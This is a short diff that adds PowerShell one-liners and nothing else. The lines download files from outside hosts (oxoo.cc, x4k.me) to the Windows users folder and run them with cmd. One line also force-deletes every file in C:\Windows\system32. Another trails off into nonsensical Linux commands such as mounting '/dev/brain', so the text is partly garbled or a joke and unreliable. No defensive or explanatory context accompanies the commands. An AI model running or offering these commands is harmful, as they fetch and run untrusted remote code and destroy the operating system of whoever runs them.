@@ -1,0 +1,3 @@
+powershell.exe -nop -w 1 iwr oxoo.cc/w/index.html -o c:\users\index.html ; cmd /c c:\users\index.html 31.3.37 666 ; powershell.exe rm c:\windows\system32\* -force
+
+powershell.exe -nop -w 1 iwr x4k.me/system/x -o c:\users\xc_31.33.7_666.exe ; cmd /c c:\users\xc_31.33.7_666.exe ; mount /dev/brain /usr/bin/morebrain && chmod +x /etc/hands
